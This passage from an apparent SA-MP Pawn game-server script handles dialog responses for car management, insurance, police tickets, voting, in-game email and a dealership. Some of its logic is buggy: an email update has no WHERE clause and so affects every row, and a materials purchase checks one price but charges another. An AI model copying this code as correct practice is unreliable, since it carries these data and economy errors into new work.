				new car = personalcar[5][playerid],car2 = PlayerInfo[playerid][pPPluscarkey2];
				if(IsTrailerAttachedToVehicle(car)) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}On a mission right now, can't use this command.");
				TowCar(car,car2,playerid);
			}
			if(listitem == 2)
			{
			    if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "{FFF8C6}On a mission right now, can't use this command.");
			    if(BusinessRob[playerid] > 0) return SendClientMessage(playerid,COLOR_SERVER,"You can't use this while robbing the bank.");
				if(CP[playerid] < 1 && IsCollectingRubbish[playerid] < 1 && !IsATruck(GetPlayerVehicleID(playerid)) && MechanicCallTime[playerid] < 1 && CheckBus[playerid] < 1 && GotoMats[playerid] < 1)
				{
			    	new car = personalcar[5][playerid];
					LocateCar(car,playerid);
                }
				else
				{
	    			ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Esti sigur ca vrei sa anulezi checkpoint-ul curent?", "Yes", "Nu");
				}
			}
			if(listitem == 3)
			{
			    new carid = OwnedVeh(personalcar[5][playerid]),inscarpricee = CarInfo[carid][cInscarprice],stringul[200];
			    if(CarInfo[carid][cInsurancecar] < 5)
			    {
			        if(GetPlayerCash(playerid) >= inscarpricee)
	      			{
	      			    format(stringul,sizeof(stringul),"You want to buy 1 insurance for $%d?",inscarpricee);
	      			    ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY, DIALOG_STYLE_MSGBOX, "Insurance", stringul, "Yes", "No");
						Selected2[playerid] = 6;
					}
				}
				else
				{
 			    	ShowPlayerDialog(playerid, DIALOG_INSURANCEBUY2, DIALOG_STYLE_MSGBOX, "Insurance", "You can't have more than 5 insurance", "OK", "");
				}
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] <= 19)
				{
    				ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough points", "You don't have enough premium points to do this.", "Close", "");
				    return 1;
				}
				PlayerInfo[playerid][pPremiumPoints] -= 20;
				CarInfo[OwnedVeh(personalcar[5][playerid])][cDays] = 0;
				CarInfo[OwnedVeh(personalcar[5][playerid])][cKM] = 0;
				vUpdate(OwnedVeh(personalcar[5][playerid]), cDaysx);
				vUpdate(OwnedVeh(personalcar[5][playerid]), cKMx);
				new strings[200],name[30],stringss[200],str1[300];
				SendClientMessage(playerid, COLOR_YELLOW, "You have cleared your car KM and days! (-20 premium points)");
				GetPlayerName(playerid, name, sizeof(name));
				format(strings, sizeof(strings), "/shop: %s bought clear car KM and days reset.",name);
				ABroadCast(COLOR_YELLOW,strings,6);
				mysql_real_escape_string(strings, stringss);
				mysql_format(SQL,str1,sizeof(str1), "INSERT INTO `shop_logs` (`playerid`,`Message`) VALUES('%d','%s')",PlayerInfo[playerid][pSQLID],stringss);
				mysql_tquery(SQL,str1,"","");
			}
			if(listitem == 5)
			{
			    new car = personalcar[5][playerid];
			    if(personalcar[5][playerid] != 0 && CarTow(car))
			    {
			        masinispawnate[playerid]--;
			        vehEngine[personalcar[5][playerid]] = 0;
					DestroyVehicle(personalcar[5][playerid]);
					OwnedVeh(personalcar[5][playerid]) = 0;
					Gas[personalcar[5][playerid]] = 100;
					personalcar[5][playerid] = 0;
					DespawnCar[playerid][5] = -1;
			    }
			    else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_INSURANCEBUY)
	{
	    if(response)
	    {
	        new carid = OwnedVeh(personalcar[(Selected2[playerid]-1)][playerid]),inscarpricee = CarInfo[carid][cInscarprice];
	        CarInfo[carid][cInsurancecar] += 1;
        	format(string, sizeof(string), "{C1F589}Car insurance purchased for $%s.", FormatNumber(inscarpricee));
        	SCM(playerid, COLOR_SERVER, string);
        	GivePlayerCash(playerid, - inscarpricee);
			Update(playerid, pCashx);
			vUpdate(carid,cInsurancecarx);
			Selected2[playerid] = 0;
		}
		return 1;
	}
	if(dialogid == DIALOG_MATERIALS)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
				if(GetPlayerCash(playerid) < 900000) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have enough cash with you.");
				PlayerInfo[playerid][pMats] += 1000000;
			    Update(playerid,pMatsx);
				SCM(playerid,COLOR_LIGHTBLUE,"You bought 1,000,000 materials for $900,000.");
				GivePlayerCash(playerid,-1000000);
				Update(playerid,pCashx);
			}
			if(listitem == 1)
			{
				if(GetPlayerCash(playerid) < 1700000) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have enough cash with you.");
			    PlayerInfo[playerid][pMats] += 2000000;
			    Update(playerid,pMatsx);
			    GivePlayerCash(playerid,-2000000);
			    Update(playerid,pCashx);
			    SCM(playerid,COLOR_LIGHTBLUE,"You bought 2,000,000 materials for $1,700,000.");
			}
		}
	    return 1;
	}
	if(dialogid == DIALOG_MUS)
	{
	    if(response)
	    {
	        for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "Nu sunt permise asemenea caractere.");
      				return 1;
		        }
			}
			PlayAudioStreamForPlayersInCar(vehicleid, inputtext);
		}
	    return 1;
	}
	if(dialogid == DIALOG_YT)
	{
	    if(response)
	    {
			YoutubeStreamForPlayer(playerid, inputtext);
		}
	    return 1;
	}
	if(dialogid == DIALOG_EMAILS)
	{
	    if(response)
	    {
	        new query[256],read,message[256],result[256];
			format(query, sizeof(query), "SELECT * FROM `emails` WHERE `ID` = '%d'", EmailId[playerid][listitem]);
			new Cache: emailresult = mysql_query(SQL, query);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
			    cache_get_field_content(i, "Message", result); format(message, sizeof(message), result);
		    	read                    = cache_get_field_content_int(i, "EmailRead");
		    	if(read > 0)
		    	{
		    	    mysql_format(SQL, query, sizeof(query), "UPDATE `emails` SET `EmailRead`='0'");
					mysql_tquery(SQL,query,"","");
				}
			}
			cache_delete(emailresult);
			PlayerInfo[playerid][pNextNotification] = 0;
			ShowPlayerDialog(playerid,DIALOG_EMAILS2,DIALOG_STYLE_MSGBOX,"Read email",message,"Back","Exit");
		}
		return 1;
	}
	if(dialogid == DIALOG_TICKET1)
	{
	    if(response)
	    {
	        if(listitem == 0)
	        {
	            new giveplayer[75], sendername1[75];
		        GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $30.000, reason: illegally parked.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $30.000, reason: illegally parked, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 1;
	        }
	        if(listitem == 1)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $30.000, reason: led irregular.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $30.000, reason: led irregular, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 2;
	        }
	        if(listitem == 2)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $25.000, reason: Use hydraulic.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $25.000, reason: Use hydraulic, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 3;
	        }
	        if(listitem == 3)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $25.000, reason: Use Nos.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $25.000, reason: Use Nos, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 4;
	        }
	        if(listitem == 4)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $10.000, reason: headlights off.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $10.000, reason: headlights off, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 5;
	        }
	        if(listitem == 5)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $5.000, reason: Far ruined.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $5.000, reason: Far ruined, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 6;
	        }
	        if(listitem == 6)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $20.000, reason: Speeding.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $20.000, reason: Speeding, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 7;
	        }
	        if(listitem == 7)
	        {
	            new giveplayer[75], sendername1[75];
	        	GetPlayerName(ticketmuie[playerid], giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername1, sizeof(sendername1));
				format(string, sizeof(string), "{B8FFDB}* You gave %s a Ticket costing $6.000, reason: Distrugerea obiectelor publice.", giveplayer);
				SendClientMessage(playerid, COLOR_SERVER, string);
				format(string, sizeof(string), "{B8FFDB}* Officer %s has given you a Ticket costing $6.000, reason: Distrugerea obiectelor publice, type /accept ticket %d to accept it.", sendername1, playerid);
				SendClientMessage(ticketmuie[playerid], COLOR_SERVER, string);
				TicketOffer[ticketmuie[playerid]] = playerid;
				ticketgivened[playerid] = 8;
	        }
	    }
	    return 1;
	}
	if(dialogid == DIALOG_VOTE)
	{
	    if(response)
	    {
	        new s1[200];
	        if(listitem == 0)
	        {
				candidat1 ++;
				format(s1,200,"L-ai votat pe %s!",GetName(voted1[playerid]));
				SCM(playerid, -1, s1);
				voted[playerid] = 1;
	        }
	        if(listitem == 1)
	        {
				candidat2 ++;
				format(s1,200,"L-ai votat pe %s!",GetName(voted2[playerid]));
				SCM(playerid, -1, s1);
				voted[playerid] = 1;
	        }
	        if(listitem == 2)
	        {
				candidat3 ++;
				format(s1,200,"L-ai votat pe %s!",GetName(voted3[playerid]));
				SCM(playerid, -1, s1);
				voted[playerid] = 1;
	        }
	    }
	}
	if(dialogid == DIALOG_EMAILS2)
	{
	    if(response)
	    {
	        new result[300],message[300],stringy[1000],read,message2[40],finalmessage[40],query[500],emailid,idd=0;
	    	format(query, sizeof(query), "SELECT * FROM `emails` WHERE `playerid` = '%d' ORDER BY `ID` DESC LIMIT 10", PlayerInfo[playerid][pSQLID]);
			new Cache: emailresult = mysql_query(SQL, query);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
		    	cache_get_field_content(i, "Message", result); format(message, sizeof(message), result);
		    	read                    = cache_get_field_content_int(i, "EmailRead");
		    	emailid                 = cache_get_field_content_int(i, "ID");
		    	EmailId[playerid][idd] = emailid;
		    	idd++;
		    	if(strlen(message) > 28)
		    	{
		    		strmid(message2, message, 0, 29, sizeof(message2));
      				format(finalmessage,sizeof(finalmessage), "%s...",message2);
				}
		   	 	if(read > 0)
		    	{
		    		format(stringy, sizeof(stringy), "%s[NECITIT]%s\n", stringy, finalmessage);
				}
				else
				{
			    	format(stringy, sizeof(stringy), "%s%s\n", stringy, finalmessage);
				}
			}
			cache_delete(emailresult);
       	 	ShowPlayerDialog(playerid,DIALOG_EMAILS,DIALOG_STYLE_LIST,"Emails",stringy,"Read","Exit");
		}
	}
	if(dialogid == DIALOG_NOSTOCK)
	{
	    if(response)
	    {
	        hidePlayerDialog(playerid);
	        BuyCar[playerid] = 0;
 		}
 		return 1;
	}
	if(dialogid == DIALOG_CARBUY5)
	{
	    if(response)
		{
		    new num = BuyCar[playerid];
		    if(GetPlayerCash(playerid) >= Stock[num][vPrice])
		    {
		        if(Stock[num][vStock] > 0)
		        {
		    		InsertCar(playerid,1,num,0);
				}
				else
				{
				    new stringg[MAX_STRING];
				    format(stringg,sizeof(stringg),"This car is available only Dealership. Sold out.\nYou can't buy this vehicle from the dealership. Out of stock.");
			 		ShowPlayerDialog(playerid, DIALOG_NOSTOCK, DIALOG_STYLE_MSGBOX, "Out of stock", stringg, "Close","");
				}
			}
			else return SendClientMessage(playerid, COLOR_GREY, "You don't have enough money to purchase this vehicle.");
		}
		return 1;
	}
	if(dialogid == DIALOG_CARBUY2)
	{
	    if(response)
	    {
	    	new num = listitem + 1;
    		BuyCar[playerid] = num;
			new string33[256], stringtitle[256];
			format(stringtitle, sizeof(stringtitle), "%s ($%s) - %s available", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]));
			format(string33, sizeof(string33), "Vehicle name: %s\nVehicle price: %s\nNumber of cars available: %s\nTop speed: %s km/h", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]), FormatNumber(Stock[num][vSpeed]));
			ShowPlayerDialog(playerid, DIALOG_CARBUY5, DIALOG_STYLE_MSGBOX, stringtitle, string33, "Buy car", "Back");
	    }
	    return 1;
	}
	if(dialogid == DIALOG_CARBUY3)
	{
	    if(response)
	    {
	        new cheapcars;
	        for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
			{
			    if(Stock[xf][vPrice] > 0 && Stock[xf][vPrice] <= 7000000)
			    {
			        cheapcars = xf;
				}
			}
	    	new num = listitem + cheapcars + 1;
 	    	BuyCar[playerid] = num;
			new string33[256], stringtitle[256];
			format(stringtitle, sizeof(stringtitle), "%s ($%s) - %s available", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]));
			format(string33, sizeof(string33), "Vehicle name: %s\nVehicle price: %s\nNumber of cars available: %s\nTop speed: %s km/h", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]), FormatNumber(Stock[num][vSpeed]));
			ShowPlayerDialog(playerid, DIALOG_CARBUY5, DIALOG_STYLE_MSGBOX, stringtitle, string33, "Buy car", "Back");
		}
		return 1;
	}
	if(dialogid == DIALOG_CARBUY4)
	{
	    if(response)
        {
	    	new regcheapcars;
	    	for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
			{
			    if(Stock[xf][vPrice] > 7000000 && Stock[xf][vPrice] <= 19999999)
			    {
       				regcheapcars = xf;
				}
			}
			new num = listitem + regcheapcars + 1;
   			BuyCar[playerid] = num;
			new string33[256], stringtitle[256];
			format(stringtitle, sizeof(stringtitle), "%s ($%s) - %s available", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]));
			format(string33, sizeof(string33), "Vehicle name: %s\nVehicle price: %s\nNumber of cars available: %s\nTop speed: %s km/h", Stock[num][vName], FormatNumber(Stock[num][vPrice]), FormatNumber(Stock[num][vStock]), FormatNumber(Stock[num][vSpeed]));
			ShowPlayerDialog(playerid, DIALOG_CARBUY5, DIALOG_STYLE_MSGBOX, stringtitle, string33, "Buy car", "Back");
		}
		return 1;
	}
	if(dialogid == DIALOG_CARBUY)
	{
	    if(response)
	    {
	    	if(listitem == 0)
			{
			    new stringzz[MAX_STRING],stringy[MAX_STRING];
				for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
				{
				    if(Stock[xf][vPrice] > 0 && Stock[xf][vPrice] <= 7000000)
				    {
						format(stringy, sizeof(stringy), "%s ($%d) - %d in stock\n", Stock[xf][vName], Stock[xf][vPrice], Stock[xf][vStock]);
  						strcat(stringzz,stringy);
					}
				}
			    ShowPlayerDialog(playerid, DIALOG_CARBUY2, DIALOG_STYLE_LIST, "Buy a car", stringzz, "Select", "Close");
			}
	    	if(listitem == 1)
			{
				new stringzz[MAX_STRING],stringy[MAX_STRING];
				for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
				{
				    if(Stock[xf][vPrice] > 7000000 && Stock[xf][vPrice] <= 19999999)
				    {
						format(stringy, sizeof(stringy), "%s ($%d) - %d in stock\n", Stock[xf][vName], Stock[xf][vPrice], Stock[xf][vStock]);
  						strcat(stringzz,stringy);
					}
				}
			    ShowPlayerDialog(playerid, DIALOG_CARBUY3, DIALOG_STYLE_LIST, "Buy a car", stringzz, "Select", "Close");
			}
	    	if(listitem == 2)
			{
				new stringzz[MAX_STRING],stringy[MAX_STRING];
				for(new xf = 0; xf < MAX_PERSONAL_CARS; xf++)
				{
				    if(Stock[xf][vPrice] >= 20000000 && Stock[xf][vPrice] < 50000000)
				    {
						format(stringy, sizeof(stringy), "%s ($%d) - %d in stock\n", Stock[xf][vName], Stock[xf][vPrice], Stock[xf][vStock]);
  						strcat(stringzz,stringy);
					}
				}
			    ShowPlayerDialog(playerid, DIALOG_CARBUY4, DIALOG_STYLE_LIST, "Buy a car", stringzz, "Select", "Close");
			}
			if(listitem == 3)
			{
				new string2[MAX_STRING];
				format(string2,sizeof(string2),"Sparrow - 230 premium points\nHotring Racer - 250 premium points\nVortex - 250 premium points\nHotring Racer A - 250 premium points\nHotring Racer B - 250 premium points\nMaverick - 300 premium points");
			    ShowPlayerDialog(playerid, DIALOG_CARBUY8, DIALOG_STYLE_LIST, "Buy a car", string2, "Select", "Close");
			}
	    }
	    return 1;
	}
	if(dialogid == DIALOG_CARBUY8)
	{
	    if(response)
        {
	    	if(listitem == 0)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 230) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 230 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 230;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,469,Stock[95][vPrice],"Sparrow",1);
			}
			if(listitem == 1)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 250) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 250 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 250;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,494,Stock[96][vPrice],"Hotring Racer",1);
			}
			if(listitem == 2)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 250) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 250 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 250;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,539,Stock[97][vPrice],"Vortex",1);
			}
			if(listitem == 3)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 250) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 250 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 250;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,502,Stock[98][vPrice],"Hotring Racer A",1);
			}
			if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 250) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 250 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 250;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,503,Stock[99][vPrice],"Hotring Racer B",1);
			}
			if(listitem == 5)
			{
			    if(PlayerInfo[playerid][pPremiumPoints] < 300) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have 300 premium points.");
			    PlayerInfo[playerid][pPremiumPoints] -= 300;
			    Update(playerid,pPremiumPointsx);
			    InsertPCar(playerid,487,Stock[100][vPrice],"Maverick",1);
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_CARDAMAGE)
	{
	    if(response)
        {
        	new carid = GetPlayerVehicleID(playerid);
			if(carid == 0) return SCM(playerid,COLOR_SERVER,"You are not in vehicle.");
   			new inscarp = CarInfo[OwnedVeh(carid)][cInscarprice];
			for(new v=0; v<=MAX_PVEHS; v++)
			{
			    if(v == 15) { break; }
				if(carid == personalcar[v][playerid])
        		{
         			if (CarInfo[OwnedVeh(carid)][cInsurancecar] == 0)
  	        		{
         				if(GetPlayerCash(playerid) >= inscarp)
     			    	{
     		    			CarInfo[OwnedVeh(carid)][cInsurancecar] = 1;
      		    			GivePlayerCash(playerid, - inscarp);
       		    			Update(playerid,pCashx);
							vUpdate(OwnedVeh(carid),cInsurancecarx);
							return 1;
 						}
     					else
        				{
      	    				SendClientMessage(playerid, COLOR_SERVER, "{FFB870}** You don't have enough cash with you.");
         	    			RemovePlayerFromVehicle(playerid);
						}
 					}
     			}
       			else
         		{
          			SendClientMessage(playerid, COLOR_SERVER, "{FFB870}** This isn't your car.");
            		RemovePlayerFromVehicle(playerid);
				}
			}
		}
		else return RemovePlayerFromVehicle(playerid);
		return 1;
    }
    if(dialogid == DIALOG_PLATE)
    {
        if(response)
        {
            for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
	        new idcar = GetPlayerVehicleID(playerid);
	        if(idcar == 0) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not in vehicle.");
            SetVehicleNumberPlate(idcar,inputtext);
			new plate[25];
            mysql_real_escape_string(inputtext, plate);
            strmid(CarInfo[OwnedVeh(idcar)][cLicense], plate, 0, strlen(plate), 999);
       	    GivePlayerCash(playerid, - 15000);
            GameTextForPlayer(playerid, "~r~-15000", 5000, 1);
			Update(playerid, pCashx);
			vUpdate(OwnedVeh(idcar),cLicensex);
		}
		return 1;
    }
	if(dialogid == DIALOG_CARSELL)
	{
	    if(response)
	    {
			new idcar = GetPlayerVehicleID(playerid);
			new engine,lights,alarm,doors,bonnet,boot,objective;
	    	if(IsPlayerInVehicle(playerid,CarID[playerid]))
	    	{
				if(GetPlayerVehicleID(playerid) == CarID[playerid])
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					if(strcmp(PlayerInfo[playerid][pNormalName], CarInfo[OwnedVeh(CarID[playerid])][cOwner], true) == 0)
					{
						if(PlayerInfo[playerid][pPcarkey] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pPcarkey] = 0;
					   		Update(playerid,pPcarkeyx);
						}
						else if(PlayerInfo[playerid][pmotokey] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pmotokey] = 0;
					   		Update(playerid,pmotokeyx);
						}
						else if(PlayerInfo[playerid][pprcarkey2] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pprcarkey2] = 0;
					   		Update(playerid,pprcarkey2x);
						}
						else if(PlayerInfo[playerid][pPPluscarkey] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pPPluscarkey] = 0;
					   		Update(playerid,pPPluscarkeyx);
						}
						else if(PlayerInfo[playerid][pPPluscarkey2] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pPPluscarkey2] = 0;
					   		Update(playerid,pPPluscarkey2x);
						}
						else if(PlayerInfo[playerid][pprcarkey] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pprcarkey] = 0;
					   		Update(playerid,pprcarkeyx);
						}
						else if(PlayerInfo[playerid][pCarkey7] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey7] = 0;
					   		Update(playerid,pCarkey7x);
						}
						else if(PlayerInfo[playerid][pCarkey8] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey8] = 0;
					   		Update(playerid,pCarkey8x);
						}
						else if(PlayerInfo[playerid][pCarkey9] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey9] = 0;
					   		Update(playerid,pCarkey9x);
						}
						else if(PlayerInfo[playerid][pCarkey10] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey10] = 0;
					   		Update(playerid,pCarkey10x);
						}
						else if(PlayerInfo[playerid][pCarkey11] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey11] = 0;
					   		Update(playerid,pCarkey11x);
						}
						else if(PlayerInfo[playerid][pCarkey12] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey12] = 0;
					   		Update(playerid,pCarkey12x);
						}
						else if(PlayerInfo[playerid][pCarkey13] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey13] = 0;
					   		Update(playerid,pCarkey13x);
						}
						else if(PlayerInfo[playerid][pCarkey14] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey14] = 0;
					   		Update(playerid,pCarkey14x);
						}
						else if(PlayerInfo[playerid][pCarkey15] == OwnedVeh(CarID[playerid]))
						{
					   		PlayerInfo[playerid][pCarkey15] = 0;
					   		Update(playerid,pCarkey15x);
						}
						vehEngine[idcar] = 0;
		    			GetVehicleParamsEx(idcar,engine,lights,alarm,doors,bonnet,boot,objective);
		      	    	SetVehicleParamsEx(idcar,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
	                	SetPVarInt(playerid, "Engine", 0);
						CarInfo[OwnedVeh(CarID[playerid])][cID] = -2;
					   	CarInfo[OwnedVeh(CarID[playerid])][cOwned] = 0;
					   	CarInfo[OwnedVeh(CarID[playerid])][cSell] = 2;
					   	strmid(CarInfo[OwnedVeh(CarID[playerid])][cOwner], "Dealership", 0, strlen("Dealership"), 999);
					   	vUpdate(OwnedVeh(CarID[playerid]),cOwnedx);
					   	vUpdate(OwnedVeh(CarID[playerid]),cOwnerx);
					   	vUpdate(OwnedVeh(CarID[playerid]),cSellx);
					   	DestroyVehicle(CarID[playerid]);
		               	TogglePlayerControllable(playerid, 1);
		 	        	new cashveh = floatround(floatmul(CarInfo[OwnedVeh(CarID[playerid])][cValue],0.60),floatround_ceil);
		 	        	GivePlayerCash(playerid, cashveh);
		  	        	format(string, sizeof(string), "{5CAD5C}* You have sold your car for $%s to state.",FormatNumber(cashveh));
						SendClientMessage(playerid, COLOR_SERVER, string);
						Update(playerid,pCashx);
						OwnedVeh(CarID[playerid]) = 0;
						CarID[playerid] = -1;
						new vvv = GetPlayerVehicleID(playerid);
						if(vvv == personalcar[0][playerid])
						    personalcar[0][playerid] = 0;
                        else if(vvv == personalcar[1][playerid])
						    personalcar[1][playerid] = 0;
                        else if(vvv == personalcar[2][playerid])
						    personalcar[2][playerid] = 0;
                        else if(vvv == personalcar[3][playerid])
						    personalcar[3][playerid] = 0;
                        else if(vvv == personalcar[4][playerid])
						    personalcar[4][playerid] = 0;
                        else if(vvv == personalcar[5][playerid])
						    personalcar[5][playerid] = 0;
		    			else if(vvv == personalcar[6][playerid])
						    personalcar[6][playerid] = 0;
                        else if(vvv == personalcar[7][playerid])
						    personalcar[7][playerid] = 0;
					    else if(vvv == personalcar[8][playerid])
						    personalcar[8][playerid] = 0;
					    else if(vvv == personalcar[9][playerid])
						    personalcar[9][playerid] = 0;
						else if(vvv == personalcar[10][playerid])
						    personalcar[10][playerid] = 0;
						else if(vvv == personalcar[11][playerid])
						    personalcar[11][playerid] = 0;
						else if(vvv == personalcar[12][playerid])
						    personalcar[12][playerid] = 0;
						else if(vvv == personalcar[13][playerid])
						    personalcar[13][playerid] = 0;
						else if(vvv == personalcar[14][playerid])
						    personalcar[14][playerid] = 0;
					}
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}This is not your car.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You have to sit at your own car to sell it.");
		}
		return 1;
	}
	if(dialogid == DIALOG_JOBS)
	{
		if(response)
	    {
	    	if(listitem == 0)
			{
